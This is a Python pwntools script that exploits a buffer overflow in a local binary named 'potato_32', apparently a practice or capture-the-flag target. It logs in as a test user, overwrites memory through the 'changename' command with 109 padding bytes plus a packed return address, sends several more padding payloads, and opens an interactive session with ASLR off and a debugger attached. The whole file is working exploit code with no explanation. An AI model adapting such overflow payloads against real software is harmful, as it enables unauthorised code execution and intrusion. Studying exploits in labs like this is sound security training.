#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato_32")
# context.binary = elf
# context.arch = 'i386'
# context.bits = 32
# context.endian = 'little'
# context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

p.sendline(b"changename")
payload = b"\x41"*109 + p32(0x804f317) 
p.sendline(payload)

print(p.recvuntil(b"cmd>"))
p.sendline("whoami")

p.sendline(b"changename")
payload = b"\x41"*53
p.sendline(payload)

p.sendline(b"changename")
payload = b"\x41"*52
p.sendline(payload)

p.sendline(b"changename")
payload = b"peter"
p.sendline(payload)

p.interactive()